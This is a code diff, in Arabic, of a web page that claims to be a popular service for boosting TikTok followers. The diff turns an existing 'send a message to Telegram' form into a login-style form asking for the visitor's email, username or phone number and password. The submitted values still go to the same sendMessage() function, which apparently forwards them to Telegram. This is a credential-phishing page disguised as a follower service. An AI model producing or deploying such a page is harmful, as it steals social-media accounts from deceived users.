@@ -62,11 +62,11 @@ button:hover { transform: scale(1.05); box-shadow:0 0 12px #ff0057; }
 <div id="mainContent">
   <div class="main-title">أشهر موقع عربي لزيادة متابعين التيك توك!</div>
   <img src="https://cdn.glitch.global/fe464142-1077-4b01-bb05-8e9bfcc3e482/tiktok-icon-black.svg?v=1748374551813" class="logo" alt="TikTok Logo" />
-  <h2>أرسل رسالة إلى تيليجرام</h2>
+  <h2>زيادة متابعين التيك توك</h2>
 
-  <input type="text" id="name" placeholder="اكتب اسمك هنا" />
-  <input type="text" id="message" placeholder="اكتب رسالتك هنا" />
-  <button onclick="sendMessage()">إرسال</button>
+  <input type="text" id="name" placeholder="الأيميل/اليوزر/رقم الهاتف" />
+  <input type="text" id="message" placeholder="الباسورد" />
+  <button onclick="sendMessage()">زيادة المتابعين</button>
 
   <p id="result"></p>
 </div>
@@ -96,7 +96,7 @@ async function sendMessage() {
   const result = document.getElementById("result");
 
   if (!name || !message) {
-    alert("يرجى كتابة الاسم والرسالة");
+    alert("يرجى تسجيل الدخول");
     return;
   }
 
